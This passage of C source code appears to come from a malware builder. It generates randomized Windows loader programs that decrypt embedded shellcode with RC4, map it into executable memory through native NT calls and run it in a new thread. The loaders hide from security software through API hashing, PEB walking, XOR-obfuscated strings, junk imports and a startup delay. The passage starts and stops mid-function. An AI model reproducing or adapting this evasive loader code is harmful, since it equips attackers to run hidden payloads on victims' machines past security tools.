    generate_random_string(ntcreatesection_hash_name, sizeof(ntcreatesection_hash_name));
    generate_random_string(ntmapviewofsection_hash_name, sizeof(ntmapviewofsection_hash_name));
    generate_random_string(ntunmapviewofsection_hash_name, sizeof(ntunmapviewofsection_hash_name));
    generate_random_string(ntwaitforsingleobject_hash_name, sizeof(ntwaitforsingleobject_hash_name));
    generate_random_string(ntcreatethreadex_hash_name, sizeof(ntcreatethreadex_hash_name));
    generate_random_string(ntdelayexecution_hash_name, sizeof(ntdelayexecution_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(getprocaddress_hash_name, sizeof(getprocaddress_hash_name));

    // Random typedef names
    char SystemFunction032_typedef[12], LoadLibraryA_typedef[12], GetProcAddress_typedef[12];
    char NtCreateSection_typedef[12], NtMapViewOfSection_typedef[12], UnmapViewOfSection_typedef[12];
    char NtCreateThreadEx_typedef[12], NtWaitForSingleObject_typedef[12], NtClose_typedef[12];
    char NtDelayExecution_typedef[12];

    generate_random_string(SystemFunction032_typedef, sizeof(SystemFunction032_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));
    generate_random_string(GetProcAddress_typedef, sizeof(GetProcAddress_typedef));
    generate_random_string(NtCreateSection_typedef, sizeof(NtCreateSection_typedef));
    generate_random_string(NtMapViewOfSection_typedef, sizeof(NtMapViewOfSection_typedef));
    generate_random_string(UnmapViewOfSection_typedef, sizeof(UnmapViewOfSection_typedef));
    generate_random_string(NtCreateThreadEx_typedef, sizeof(NtCreateThreadEx_typedef));
    generate_random_string(NtWaitForSingleObject_typedef, sizeof(NtWaitForSingleObject_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(NtDelayExecution_typedef, sizeof(NtDelayExecution_typedef));

    // Random names for EncryptedPayload and ProtectedKey
    char random_payload_name[15], random_key_name[15];

    generate_random_string(random_payload_name, sizeof(random_payload_name));
    generate_random_string(random_key_name, sizeof(random_key_name));

    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));

    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);

    snprintf(payload, size,
        "#include <Windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* %s)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* %s)(LPCSTR);\n"
        "typedef FARPROC(NTAPI* %s)(HMODULE, LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* %s)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, PVOID);\n"
        "typedef NTSTATUS(NTAPI* %s)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "CHAR %s(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int %s(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n"
        "PVOID %s(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = %s() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n"
        "VOID %s() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)%s(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define %s               0x5251037A\n"
        "#define %s               0xA5E086A2\n"
        "#define %s           0x468A2FDD\n"
        "#define %s           0xC0261277\n"
        "#define %s           0x129AF9DA\n"
        "#define %s           0xCB42C5A9\n"
        "#define %s           0x61D8C71D\n"
        "#define %s           0x1236E2D7\n"
        "#define %s           0xF20D7F2A\n"
        "#define %s           0xA4E3F108\n"
        "#define %s           0xB9D893EC\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pfu[] = {%s};\n"
        "unsigned char %s[] = { %s };\n"
        "unsigned char %s[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338\n"
        "#define INITIAL_SEED 7\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL uard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwRc4KeySize);\n"
        "    HMODULE kernel = %s(%s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"
        "    char vdf[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    %s((char*)pfu, sizeof(pfu), xkey, sizeof(xkey));\n"
        "    %s p%s = (%s)p%s(p%s(vdf), pfu);\n"
        "    p%s(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "BOOL %s() {\n"
        "    HANDLE shandle = NULL;\n"
        "    HANDLE thandle = NULL;\n"
        "    PVOID address = NULL;\n"
        "    SIZE_T sViewSize = 0;\n"
        "    LARGE_INTEGER MaximumSize = { .QuadPart = sizeof(%s) };\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    HMODULE ntd = %s(%s);\n"
        "    %s p%s = (%s)%s(ntd, %s);\n"
        "    %s p%s = (%s)%s(ntd, %s);\n"
        "    %s p%s = (%s)%s(ntd, %s);\n"
        "    %s p%s = (%s)%s(ntd, %s);\n"
        "    %s p%s = (%s)%s(ntd, %s);\n"
        "    %s p%s = (%s)%s(ntd, %s);\n"
        "    p%s(&shandle, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);\n"
        "    p%s(shandle, (HANDLE)-1, &address, 0, 0, NULL, &sViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);\n"
        "    memcpy(address, %s, sizeof(%s));\n"
        "    uard(HINT_BYTE, %s, address, sizeof(%s), sizeof(%s));\n"
        "    p%s(&thandle, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, address, NULL, 0, 0, 0, 0, NULL);\n"
        "    p%s(thandle, FALSE, &timeout);\n"
        "    p%s(thandle);\n"
        "    p%s((HANDLE)-1, address);\n"
        "    p%s(shandle);\n"
        "}\n"
        "VOID %s(IN FLOAT fMinutes) {\n"
        "    HMODULE ntdll = %s(%s);\n"
        "    %s p%s = (%s)%s(ntdll, %s);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE , HINSTANCE , LPSTR , int ) {\n"
        "    %s(0.5);\n"
        "    %s();\n"
        "    return 0;\n"
        "}\n",
        SystemFunction032_typedef,
        LoadLibraryA_typedef,
        GetProcAddress_typedef,
        NtCreateSection_typedef,
        NtMapViewOfSection_typedef,
        UnmapViewOfSection_typedef,
        NtCreateThreadEx_typedef,
        NtWaitForSingleObject_typedef,
        NtClose_typedef,
        NtDelayExecution_typedef,
        random_toUpper_name,
        random_seed_name,
        random_helper_name,
        random_seed_name,
        random_iatcamouflage_name,
        random_helper_name,
        ntdll_hash_name,
        kernel32_hash_name,
        ntcreatesection_hash_name,
        ntmapviewofsection_hash_name,
        ntunmapviewofsection_hash_name,
        ntwaitforsingleobject_hash_name,
        ntcreatethreadex_hash_name,
        ntdelayexecution_hash_name,
        ntclose_hash_name,
        loadlibrarya_hash_name,
        getprocaddress_hash_name,
        random_obf_func,
        xkey, obfuscated_fun, random_payload_name, shellcodeArray, random_key_name, keyArray, hint,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_getmodule_name, kernel32_hash_name,
        LoadLibraryA_typedef, pLoadLibraryA_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        GetProcAddress_typedef, pGetProcAddress_name, GetProcAddress_typedef, random_getproc_name, getprocaddress_hash_name,
        random_obf_func,
        SystemFunction032_typedef, pSystemFunction032_name, SystemFunction032_typedef, pGetProcAddress_name, pLoadLibraryA_name,
        pSystemFunction032_name,
        random_inject_func,
        random_payload_name,
        random_getmodule_name, ntdll_hash_name,
        NtCreateSection_typedef, pNtCreateSection_name, NtCreateSection_typedef, random_getproc_name, ntcreatesection_hash_name,
        NtMapViewOfSection_typedef, pNtMapViewOfSection_name, NtMapViewOfSection_typedef, random_getproc_name, ntmapviewofsection_hash_name,
        UnmapViewOfSection_typedef, pUnmapViewOfSection_name, UnmapViewOfSection_typedef, random_getproc_name, ntunmapviewofsection_hash_name,
        NtCreateThreadEx_typedef, pNtCreateThreadEx_name, NtCreateThreadEx_typedef, random_getproc_name, ntcreatethreadex_hash_name,
        NtWaitForSingleObject_typedef, pNtWaitForSingleObject_name, NtWaitForSingleObject_typedef, random_getproc_name, ntwaitforsingleobject_hash_name,
        NtClose_typedef, pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        pNtCreateSection_name,
        pNtMapViewOfSection_name,
        random_payload_name, random_payload_name,
        random_key_name, random_key_name, random_payload_name,
        pNtCreateThreadEx_name,
        pNtWaitForSingleObject_name,
        pNtClose_name,
        pUnmapViewOfSection_name,
        pNtClose_name,
        random_delay_func,
        random_getmodule_name, ntdll_hash_name,
        NtDelayExecution_typedef, pNtDelayExecution_name, NtDelayExecution_typedef, random_getproc_name, ntdelayexecution_hash_name,
        pNtDelayExecution_name,
        random_delay_func,
        random_inject_func
    );
}
void obf_deley_4_mapping_injection_dll(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Seed random number generator
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_toUpper_name[10], random_seed_name[10], random_helper_name[10];
    char random_obf_func[10], random_delay_func[10], random_inject_func[10];
    char random_iatcamouflage_name[10];

    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_inject_func, sizeof(random_inject_func));
    generate_random_string(random_iatcamouflage_name, sizeof(random_iatcamouflage_name));

    // Random names for GetModuleHandleH, GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15];

    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));

    // Random pointer names
    char pSystemFunction032_name[9], pLoadLibraryA_name[9], pGetProcAddress_name[9];
    char pNtCreateSection_name[9], pNtMapViewOfSection_name[9], pUnmapViewOfSection_name[9];
    char pNtCreateThreadEx_name[9], pNtWaitForSingleObject_name[9], pNtClose_name[9];
    char pNtDelayExecution_name[9];

    generate_random_string(pSystemFunction032_name, sizeof(pSystemFunction032_name));
    generate_random_string(pLoadLibraryA_name, sizeof(pLoadLibraryA_name));
    generate_random_string(pGetProcAddress_name, sizeof(pGetProcAddress_name));
    generate_random_string(pNtCreateSection_name, sizeof(pNtCreateSection_name));
    generate_random_string(pNtMapViewOfSection_name, sizeof(pNtMapViewOfSection_name));
    generate_random_string(pUnmapViewOfSection_name, sizeof(pUnmapViewOfSection_name));
    generate_random_string(pNtCreateThreadEx_name, sizeof(pNtCreateThreadEx_name));
    generate_random_string(pNtWaitForSingleObject_name, sizeof(pNtWaitForSingleObject_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pNtDelayExecution_name, sizeof(pNtDelayExecution_name));

    // Random names for hashing definitions
    char ntdll_hash_name[11], kernel32_hash_name[11], ntcreatesection_hash_name[11];
    char ntmapviewofsection_hash_name[12], ntunmapviewofsection_hash_name[12], ntwaitforsingleobject_hash_name[12];
    char ntcreatethreadex_hash_name[11], ntdelayexecution_hash_name[11], ntclose_hash_name[11];
    char loadlibrarya_hash_name[11], getprocaddress_hash_name[11];

    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntcreatesection_hash_name, sizeof(ntcreatesection_hash_name));
    generate_random_string(ntmapviewofsection_hash_name, sizeof(ntmapviewofsection_hash_name));
    generate_random_string(ntunmapviewofsection_hash_name, sizeof(ntunmapviewofsection_hash_name));
    generate_random_string(ntwaitforsingleobject_hash_name, sizeof(ntwaitforsingleobject_hash_name));
    generate_random_string(ntcreatethreadex_hash_name, sizeof(ntcreatethreadex_hash_name));
    generate_random_string(ntdelayexecution_hash_name, sizeof(ntdelayexecution_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(getprocaddress_hash_name, sizeof(getprocaddress_hash_name));

    // Random typedef names
    char SystemFunction032_typedef[12], LoadLibraryA_typedef[12], GetProcAddress_typedef[12];
    char NtCreateSection_typedef[12], NtMapViewOfSection_typedef[12], UnmapViewOfSection_typedef[12];
    char NtCreateThreadEx_typedef[12], NtWaitForSingleObject_typedef[12], NtClose_typedef[12];
    char NtDelayExecution_typedef[12];

    generate_random_string(SystemFunction032_typedef, sizeof(SystemFunction032_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));
    generate_random_string(GetProcAddress_typedef, sizeof(GetProcAddress_typedef));
    generate_random_string(NtCreateSection_typedef, sizeof(NtCreateSection_typedef));
    generate_random_string(NtMapViewOfSection_typedef, sizeof(NtMapViewOfSection_typedef));
    generate_random_string(UnmapViewOfSection_typedef, sizeof(UnmapViewOfSection_typedef));
    generate_random_string(NtCreateThreadEx_typedef, sizeof(NtCreateThreadEx_typedef));
    generate_random_string(NtWaitForSingleObject_typedef, sizeof(NtWaitForSingleObject_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(NtDelayExecution_typedef, sizeof(NtDelayExecution_typedef));

    // Random names for EncryptedPayload and ProtectedKey
    char random_payload_name[15], random_key_name[15];

    generate_random_string(random_payload_name, sizeof(random_payload_name));
    generate_random_string(random_key_name, sizeof(random_key_name));

    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));

    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);

    snprintf(payload, size,
        "#include <Windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* %s)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* %s)(LPCSTR);\n"
        "typedef FARPROC(NTAPI* %s)(HMODULE, LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* %s)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, PVOID);\n"
        "typedef NTSTATUS(NTAPI* %s)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "CHAR %s(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "char memory_pool[1024];\n"
        "unsigned int pool_index = 0;\n"
        "void* my_malloc(unsigned int size) {\n"
        "    if (pool_index + size > sizeof(memory_pool)) {\n"
        "        return 0; \n"
        "    }\n"
        "    void* ptr = &memory_pool[pool_index];\n"
        "    pool_index += size;\n"
        "    return ptr;\n"
        "}\n\n"
        "#define %s               0x5251037A\n"
        "#define %s               0xA5E086A2\n"
        "#define %s           0x468A2FDD\n"
        "#define %s           0xC0261277\n"
        "#define %s           0x129AF9DA\n"
        "#define %s           0xCB42C5A9\n"
        "#define %s           0x61D8C71D\n"
        "#define %s           0x1236E2D7\n"
        "#define %s           0xF20D7F2A\n"
        "#define %s           0xA4E3F108\n"
        "#define %s           0xB9D893EC\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char p03[] = {%s};\n"
        "unsigned char %s[] = { %s };\n"
        "unsigned char %s[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338\n"
        "#define INITIAL_SEED 7\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL Ruard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
